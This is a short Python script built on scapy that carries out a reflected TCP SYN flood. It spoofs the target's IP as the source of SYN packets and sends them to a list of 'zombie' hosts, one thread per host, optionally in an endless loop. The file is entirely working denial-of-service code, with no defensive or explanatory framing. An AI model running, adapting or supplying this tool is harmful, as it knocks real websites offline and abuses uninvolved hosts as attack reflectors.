import sys,random,socket,time
from scapy.all import *
from threading import Thread

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def sendPacket(target,port,zombie_ip):
    sport = randInt() # RANDOM SOURCE PORT
    seq = randInt()
    window = randInt()

    IP_PACKET     = IP()
    try:
        IP_PACKET.src = target
        IP_PACKET.dst = zombie_ip
    except:
        pass

    TCP_PACKET        = TCP()
    TCP_PACKET.sport  = sport # SOURCE PORT
    TCP_PACKET.dport  = int(port) # DESTINATION PORT
    TCP_PACKET.flags  = "S" # SYN
    TCP_PACKET.seq    = seq
    TCP_PACKET.window = window

    try:
        send(IP_PACKET/TCP_PACKET, verbose=0)
        time.sleep(1)
    except Exception as error:
        print('.',error)
        pass

def attack(target,port,src_ip,count=0):
    if count > 0:
        for i in range(0,count):
            sendPacket(target,port,src_ip)
    else:
        while True:
            sendPacket(target,port,src_ip)

def flood(target,zombies,user_required,port=80,count=0):
    if target.startswith('http://'):
        target = target.replace('http://','')
        port   = 80
        target = socket.gethostbyname(target)
    elif target.startswith('https://'):
        target = target.replace('https://','')
        port   = 443
        target = socket.gethostbyname(target)
    
    for zombie in zombies:
        if zombies[zombie] == user_required:
            continue
        Thread(target=attack,args=(target,port,zombie[0],count)).start()